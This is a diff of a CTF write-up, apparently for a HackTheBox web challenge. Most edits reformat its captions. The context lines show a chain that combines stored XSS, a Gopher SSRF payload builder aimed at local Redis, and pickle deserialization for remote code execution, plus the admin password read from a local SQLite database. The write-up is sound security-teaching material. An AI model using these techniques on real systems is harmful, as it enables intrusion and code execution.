@@ -27,8 +27,7 @@ At a high level, the web application had three issues. When chained together, I 
 3. Exploiting the Python `pickle` module's deserialization vulnerability to inject and remotely execute code (RCE).
 
 ![Screenshot of the application’s main page.](/img/Hacking_the_Modern_Stack/Untitled.png)
-
-Screenshot of the application’s main page.
+*Screenshot of the application’s main page.*
 
 ## **Recon & Enumeration: Figuring Out How the Application Works**<a name="recon"></a>
 
@@ -36,9 +35,8 @@ Before downloading the source code and building the Docker image, I conducted re
 
 Based on these initial findings, I concluded that the API was likely only accessible via a local loopback address such as `127.0.0.1`.
 
-![We are testing the standard functionality of the submission page. ](/img/Hacking_the_Modern_Stack/Untitled%201.png)
-
-We are testing the standard functionality of the submission page. 
+![We are testing the standard functionality of the submission page.](/img/Hacking_the_Modern_Stack/Untitled%201.png)
+*We are testing the standard functionality of the submission page.* 
 
 Since the CTF competition is time-sensitive, with the first flag submission for a challenge yielding the most points, I decided to conduct a quick series of standard cross-site scripting tests. However, these attempts proved unsuccessful.
 
@@ -48,7 +46,7 @@ When reviewing a new project, my standard practice is to perform a quick `tree`
 
 ![Listing all the directories and files, attempting to understand the scope and where we should look first.](/img/Hacking_the_Modern_Stack/Untitled%202.png)
 
-Listing all the directories and files, attempting to understand the scope and where we should look first.
+*Listing all the directories and files, attempting to understand the scope and where we should look first.*
 
 The first two files I examined were the build files for the Docker container. By exploring the build files, we can uncover the application's roots and gain insights into its setup. Additionally, we can identify the specific technologies and frameworks utilized in the application.
 
@@ -59,6 +57,7 @@ docker run -p 1337:1337 --rm \
     -v "$(pwd)/challenge/application:/app/application" \
     -v "$(pwd)/challenge/worker:/app/worker" \
 ```
+*`build-docker.sh`*
 
 The Docker container runs two Python applications, a worker and an application for the web application itself. In separate directories are each application. The worker likely performs background tasks or handles asynchronous processes. The web application runs the main functionality of the application and listens on port 1337.
 
@@ -113,6 +112,7 @@ ENV PYTHONDONTWRITEBYTECODE=1
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
 ```
+*`Dockerfile`*
 
 The Docker container compiles a flag reader program written in C and assigns it `4755` permissions. It's worth noting that setting the permissions to `4755` means that the compiled program will have the setuid bit enabled. This bit allows the program to be executed with the privileges of the file owner, rather than the user running it. Programs that require elevated privileges or special permissions often happen in web application development.
 
@@ -175,6 +175,7 @@ def forbidden(error):
 def bad_request(error):
     return response('400 Bad Request', 400)
 ```
+*`main.py`*
 
 In `main.py`, we can see we're working with a Flask app, it has a Redis backend, and we have some authenticated user activities interacting with the `/api`. Next, I was interested in how the API handles requests, so let's look at the blueprint file referenced on line 23 of `main.py`, `/application/blueprints/routes.py`.
 
@@ -318,12 +319,12 @@ def logout():
     logout_user()
     return redirect('/')
 ```
+*`routes.py`*
 
 Upon reviewing **`routes.py`**, it becomes apparent that this file plays a crucial role in the assessment as it contains key functions for the site's functionality. When examining the original functionality of the site, the **`request_quote()`** function executes after submitting a quote request.
 
 ![I'm inspecting the functionality of the GET A QUOTE button; notice how the event is a `POST` request made to `/api/request-quote`. This `request-quote` should be our most scrutinized potential entry point for exploitation. If I didn't care about the stack technologies utilized by the application, we could have just jumped to an analysis on this function rather than reviewing the build files, `main`, and more.; I viewed this as an assessment, so I wanted to be as thorough as possible.](/img/Hacking_the_Modern_Stack/Untitled%203.png)
-
-I'm inspecting the functionality of the GET A QUOTE button; notice how the event is a `POST` request made to `/api/request-quote`. This `request-quote` should be our most scrutinized potential entry point for exploitation. If I didn't care about the stack technologies utilized by the application, we could have just jumped to an analysis on this function rather than reviewing the build files, `main`, and more.; I viewed this as an assessment, so I wanted to be as thorough as possible.
+*I'm inspecting the functionality of the GET A QUOTE button; notice how the event is a `POST` request made to `/api/request-quote`. This `request-quote` should be our most scrutinized potential entry point for exploitation. If I didn't care about the stack technologies utilized by the application, we could have just jumped to an analysis on this function rather than reviewing the build files, `main`, and more.; I viewed this as an assessment, so I wanted to be as thorough as possible.*
 
 In the code snippet below, `request_quote()` builds a JSON query with our filled-out quote form and sends the quote to the database via the `quote_request` object. Then finally, the `request_quote()` function calls `view_requests()` and `clear_requests()`. Let's look at the `view_requests()` function; the function is in `bot.py`.
 
@@ -411,6 +412,7 @@ def view_requests():
     finally:
         pass
 ```
+*`bot.py`*
 
 Reviewing the API routing in `routes.py` confirms that an admin login must interact with the `/admin/quote-requests` endpoint. Additionally, the `render_template` function sends the data from the quote request to `requests.html`. Let's examine the relevant code snippets:
 
@@ -444,8 +446,7 @@ I confirmed this XSS using an ephemeral webhook at [https://webhook.site](https:
 ![Untitled](/img/Hacking_the_Modern_Stack/Untitled%204.png)
 
 ![Success! *By the way, I've used "Web bug / URL token," [CanaryTokens](https://www.canarytokens.org/generate#), in the past, but there are a few minutes of delay to receive an email stating that your token has triggered; webhooks are much faster and provide additional curious information like HTTP headers such as `referer`. Webhooks have become widely used for receiving immediate notifications and triggering actions based on specific events. They offer flexibility and use in various applications, including security monitoring, integrations, and real-time data processing.*](/img/Hacking_the_Modern_Stack/Untitled%205.png)
-
-Success! *By the way, I've used "Web bug / URL token," [CanaryTokens](https://www.canarytokens.org/generate#), in the past, but there are a few minutes of delay to receive an email stating that your token has triggered; webhooks are much faster and provide additional curious information like HTTP headers such as `referer`. Webhooks have become widely used for receiving immediate notifications and triggering actions based on specific events. They offer flexibility and use in various applications, including security monitoring, integrations, and real-time data processing.*
+*Success! By the way, I've used "Web bug / URL token," [CanaryTokens](https://www.canarytokens.org/generate#), in the past, but there are a few minutes of delay to receive an email stating that your token has triggered; webhooks are much faster and provide additional curious information like HTTP headers such as `referer`. Webhooks have become widely used for receiving immediate notifications and triggering actions based on specific events. They offer flexibility and use in various applications, including security monitoring, integrations, and real-time data processing.*
 
 ## Exploring the Possibilities of Executing Arbitrary JavaScript as ADMIN <a name="exploring-xss"></a>
 
@@ -497,6 +498,7 @@ class DevelopmentConfig(Config):
 class TestingConfig(Config):
     TESTING = True
 ```
+*`config.py` file shows us the admin user account has a 30 randomized `(generate(15)` character password, and the data saves to a database file called `database.db`.*
 
 Luckily, since we have a local Docker instance of the web application, we can connect to the Docker container and grab the password out of the SQLite database as so:  
 
@@ -526,6 +528,7 @@ CREATE TABLE user (
 sqlite> SELECT password FROM user;
 8151bd7c649749015effebfb436f68
 ```
+*Connecting to our Docker container using bash; running a find command to find our database file; navigating to our database file; connecting to the database file with sqlite3 command line interface; listing the tables for the database and schema for the user table; selecting the password from the user table.*
 
 Now that we have access to the admin portal, let’s click on “Scrape”: 
 
@@ -538,8 +541,7 @@ We are directed towards the `/admin/scrape` endpoint:
 Following the breadcrumbs in the code is a common approach to understanding the functionality and flow of an application. We've discovered an API endpoint `/api/admin/scrape/create` called when clicking the "Add Job" button. Inspecting the button or examining the Docker container's logs can provide insights into the API interactions.
 
 ![Using the Inspect functionality in Firefox, clicking on the `event`, looking for the API call](/img/Hacking_the_Modern_Stack/Untitled%208.png)
-
-Using the Inspect functionality in Firefox, clicking on the `event`, looking for the API call
+*Using the Inspect functionality in Firefox, clicking on the `event`, looking for the API call.*
 
 Looking at the code for the `/admin/scrape/create` in the `[routes.py](http://routes.py)` file, we can see a function `create_job_queue(urls, job_title)`:
 
@@ -562,12 +564,14 @@ def job_create():
 
     return Response(json.dumps(data), mimetype='application/json')
 ```
+*`/admin/scrape/create` API route, `routes.py.`.*
 
 Continuing to follow the breadcrumbs, we know the `create_job_queue` is being called by the `/admin/scrape/create` endpoint. Looking at the imports at the top of the `routes.py` file, we know `create_job_queue` is from the `application.cache` file: 
 
 ```python
 from application.cache import get_job_list, create_job_queue, get_job_queue, get_job_result
 ```
+*Some of the imports at the top of `routes.py`* 
 
 Indeed, in the **`cache.py`** file, we find the **`create_job_queue(urls, job_title)`** function, which involves using Redis for caching jobs and queuing them for processing.
 
@@ -589,6 +593,7 @@ def create_job_queue(urls, job_title):
 
     return data
 ```
+*`cache.py`*
 
 Here we see Redis is caching jobs with the variable `REDIS_JOBS` and queuing them for processing in `REDIS_QUEUE`. If you're unfamiliar with [Redis](https://redis.io/docs/about/), it's a highly versatile and capable backend that can be used as a database, message queue, streaming engine, and much more.
 
@@ -701,12 +706,12 @@ if __name__ == '__main__':
         time.sleep(10)
         run_worker()
 ```
+*`\challenge\worker\main.py`*
 
 Looking at the `run_worker()` function, it executes the `process_url()` function from `scrape.py` to handle the URLs from the respective`/admin/scrape` backend: 
 
 ![Screenshot of the `/admin/scrape` backend.](/img/Hacking_the_Modern_Stack/Untitled%207.png)
-
-Screenshot of the `/admin/scrape` backend.
+*Screenshot of the `/admin/scrape` backend.*
 
 Looking at `scrape.py` and the function `process_url(url)`, we see that the function utilizes the [PycURL](http://pycurl.io/) library to perform HTTP requests and retrieve the content of a given URL. Most importantly, PycURL is curling each link without SSRF protections, which allows us to interact with the Redis backend on localhost. 
 
@@ -754,8 +759,9 @@ def process_url(url):
     images = get_images(page)
     return make_absolute_list(base,links), make_absolute_list(base,images)
 ```
+*`scrape.py`*
 
-PycURL is a Python interface to [libcurl](https://curl.se/libcurl/), and PycURL supports every protocol you could think of, including [Redis'Redis' Gopher protocol implementation](https://redis.io/docs/reference/gopher/).
+PycURL is a Python interface to [libcurl](https://curl.se/libcurl/), and PycURL supports every protocol you could think of, including [Redis' Gopher protocol implementation](https://redis.io/docs/reference/gopher/).
 
 I did a few quick Googles to figure out how to work with Gopher for SSRF, and I found these handy blogs by [Muh. Fani Akbar](https://infosecwriteups.com/exploiting-redis-through-ssrf-attack-be625682461b), [Rayhan0x01](https://www.hackthebox.com/blog/red-island-ca-ctf-2022-web-writeup#the_ssrf_with_support_of_a_plethora_of_protocols__), and another from [Manas Harsh](https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630).
 
@@ -770,6 +776,7 @@ gopherPayload = "gopher://127.0.0.1:6379/_%s" % redis_cmd.replace('\r','').repla
  
 print(gopherPayload)
 ```
+*Gopher payload creator, proof of concept*
 
 ## Chaining Payloads: From Pickle Deserialization to Redis Cache Poisoning to Game Over <a name="game-over"></a>
 
@@ -820,12 +827,12 @@ With our newly created Gopher URL, which interacts with the loopback address for
     });
 </script>
 ```
+*Proof of concept for the stored XSS.*
 
 ![The stored XSS payload is submitted. You can see the 200 Success `POST` request to `/api/admin/scrape/create`, and finally, you can see our created job is sent to `POST` on the `request-quote` API function. Magnificent!](/img/Hacking_the_Modern_Stack/Untitled%209.png)
+*The stored XSS payload is submitted. You can see the 200 Success `POST` request to `/api/admin/scrape/create`, and finally, you can see our created job is sent to `POST` on the `request-quote` API function. Magnificent!*
 
-The stored XSS payload is submitted. You can see the 200 Success `POST` request to `/api/admin/scrape/create`, and finally, you can see our created job is sent to `POST` on the `request-quote` API function. Magnificent!
-
-With the Redis cache poisoned, all we need to do is trigger the deserialization of the poisoned Redis cache and execute the injected payload. Returning to [our original analysis for the deserialization](https://www.notion.so/Hacking-the-Modern-Stack-3223b3885b47473e93fe7568d8cd1767?pvs=21), we can initiate a request to the `/admin/scrape/list` endpoint, passing the corresponding job ID `2813308004`! The initiated request will trigger the processing of the job by the worker, which will involve deserializing the payload and executing the commands within it.
+With the Redis cache poisoned, all we need to do is trigger the deserialization of the poisoned Redis cache and execute the injected payload. Returning to our original analysis for the deserialization, we can initiate a request to the `/admin/scrape/list` endpoint, passing the corresponding job ID `2813308004`! The initiated request will trigger the processing of the job by the worker, which will involve deserializing the payload and executing the commands within it.
 
 ```python
 @api.route('/admin/scrape/<int:job_id>/status', methods=['GET'])
@@ -838,6 +845,7 @@ def job_status(job_id):
 
     return Response(json.dumps(data), mimetype='application/json')
 ```
+*`get_job_queue(job_id)` is the function that deserializes our payload; it’s triggered by the `job_status` method.*
 
 ```python
 <script>
@@ -846,14 +854,13 @@ def job_status(job_id):
   });
 </script>
 ```
+*Simple XSS to trigger our stored job from our original XSS, which poisoned the Redis cache.*
 
 ![The first highlighted line demonstrates that we are indeed session riding by successfully interacting with `/login` and then sending our `POST /api/login`. Since we can authenticate, we can tell `/api/admin/scrape` to grab our stored job `2813308004` that we set in our original stored XSS, which poisoned the Redis cache. Finally, we can see `/api/request-quote` executing our job. ](/img/Hacking_the_Modern_Stack/Untitled%2010.png)
-
-The first highlighted line demonstrates that we are indeed session riding by successfully interacting with `/login` and then sending our `POST /api/login`. Since we can authenticate, we can tell `/api/admin/scrape` to grab our stored job `2813308004` that we set in our original stored XSS, which poisoned the Redis cache. Finally, we can see `/api/request-quote` executing our job. 
+*The first highlighted line demonstrates that we are indeed session riding by successfully interacting with `/login` and then sending our `POST /api/login`. Since we can authenticate, we can tell `/api/admin/scrape` to grab our stored job `2813308004` that we set in our original stored XSS, which poisoned the Redis cache. Finally, we can see `/api/request-quote` executing our job.* 
 
 ![Webhook response from our `cmd` payload.](/img/Hacking_the_Modern_Stack/Untitled%2011.png)
-
-Webhook response from our `cmd` payload.
+*Webhook response from our `cmd` payload.*
 
 Grab the flag out of your webhook response and decode it! Good game! If you run the exploit chain on the CTF instance rather than your local instance, you can see the flag: `HTB{qu3u3d_my_w4y_1nto_rc3}`.
 
